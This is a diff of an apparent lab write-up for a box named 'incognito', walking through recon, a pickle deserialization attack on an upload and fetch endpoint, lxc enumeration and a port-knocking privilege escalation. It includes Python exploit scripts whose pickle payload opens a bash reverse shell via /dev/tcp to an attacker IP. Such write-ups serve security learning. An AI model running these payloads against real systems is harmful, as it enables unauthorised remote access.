@@ -19,21 +19,27 @@ Apparently these are malders. I here to learn to boulder the malders one day.
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](Screenshots/ping.png)
 
+Nmap found:
 ![](nmapcustomjs.png)
 
+Email templating from:
 ![](incognitoemail.png)
 
+Vhost fuzzing with ffuf
 ![](fuzzthehostbeforeal.png)
 
+Gobustering directories 
 ![](gbthedev.png)
 
+Recursively again from `/secret`
 ![](secretupload.png)
 
+To find file upload page 
 ![](thesecretuploadpage.png)
-
+Checking the source for the parametres
 ![](supsource.png)
 
-This is just the message of uplaod
+This is just the message of upload - script.php
 ![](insiderthesupdir.png)
 
 ## Exploit
@@ -43,8 +49,10 @@ Where did your upload go?
 Al fixates on this:
 ![](fetch.png)
 
+I got carried away and focused on how the code was rather than returning to the page to click button..
 ![](sendRequest.png)
 
+But data is passed to /fetch with a POST. The data is json.
 ![](fetchingstuff.png)
 
 A .pkl - PKL file is a file created by pickle, a Python module that enabless objects to be serialized to files on disk and deserialized back into into the program at runtime [Ref](https://fileinfo.com/extension/pkl)
@@ -90,7 +98,7 @@ import pickle, base64, os
 
 class RCE:
     def __reduce__(self):
-        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.14.43.145/1337 <&1'")
+        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'")
         return os.system, (cmd,)
 
 
@@ -103,29 +111,34 @@ if __name__ == "__main__":
 
 ```
 
+Response to the upload
 ![](badpickles.png)
 
+"Fetching" the bad pickle
 ![](pulloutthebadpickle.png)
 
 ## Foothold
 
+With a foothold on the box 
 ![](wearein.png)
-
+Checking exec on /dev/shm and users 
 ![](dev1anddev1indevshm.png)
 
+Looking for password, Al just su to a user and we, including Al are surpised...
 ![](bash_historyforthesu.png)
 
+Yikes..
 ![](nopasswords.png)
 
 We have lxc
 ![](justinb4al.png)
 
-Root is difently checking Lxc related clust stuff
+Root is difently checking Lxc related cluster stuff
 ![](lxcenum.png)
 
 ## PrivEsc
 
-I do not think I have had one of these:
+Linpeas rummages through the email - I do not think I have had a box like this:
 ![](yougotmail.png)
 
 Change of password
@@ -178,21 +191,24 @@ Al thinks port knocking and security by obsurity is underrated. `lsattr` is a kn
 Edit
 ![](69171337.png)
 
+Restart the knockd
 ```bash
 sudo /etc/init.d/knockd restart
 ```
 
+Port knock
 ```bash
 nc incognito.com 69
 nc incognito.com 15
 nc incognito.com 1337
 ```
 
+And we are root.
 ![](root.png)
 
 ## Beyond Root
 
-In conclusion I am beating Al to things, but learnt alot about something I have vaguely remember doing. I would not have got the port knocking.vim 
+In conclusion I am beating Al to things, but learnt alot about something I have vaguely remember doing. I would not have got the port knocking.
 
 ```python
 import pickle
@@ -218,7 +234,7 @@ if __name__ == "__main__":
     with open('badpickle.pkl', 'wb') as f:
         pickle.dump(RCE(),f)
 
-    file = open("badpickle.pkl", "rb")
+    with open("badpickle.pkl", "rb") as g:
 
     body = "--" + boundary + "\r\n"
     body += "Content-Disposition: form-data; name=\"the_file\"; filename=\"badpickle.pkl\"\r\n"
@@ -237,5 +253,45 @@ if __name__ == "__main__":
         print(e)
 
     get_shell_response = request.post(rshell_url, upload_headers,data=body)
+    exit()
+```
+
+Which then became - RCE myself but progress
+```python
+import pickle
+import base64
+import os
+import requests
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.14.43.145/1337 <&1'")
+        return os.system, (cmd,)
+
+
+if __name__ == "__main__":
+    upload_url = 'http://dev.incognito.com/secret/upload/script.php'
+    upload_headers = {"Origin": "http://dev.incognito.com", "Content-Type": "multipart/form-data"}
+    rshell_url = 'http://incognito.com/fetch'
+    rshell_headers = {"Host":"incognito.com", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json", "Origin": "http://incognito.com", "Referer": "http://incognito.com/"}
+    bad_pickle_obj = '{"object":"/var/upload/badpickle.pkl"}'
+
+    with open('badpickle.pkl', 'wb') as f:
+        pickle.dump(RCE(),f)
+
+    with open("badpickle.pkl", "rb") as g:
+        thebadpickle = {'the_file': ('badpickle.pkl', pickle.load(g))}
+
+    try:
+        upload_response = requests.post(url=upload_url, headers=upload_headers, files=thebadpickle)
+        if upload_response.status_code == 200:
+            print("File uploaded successfully")
+        else:
+            print("File upload failed")
+    except requests.exceptions.RequestException as e:
+        print(e)
+
+    get_shell_response = requests.post(rshell_url, rshell_headers, data=bad_pickle_obj)
     exit()
 ```
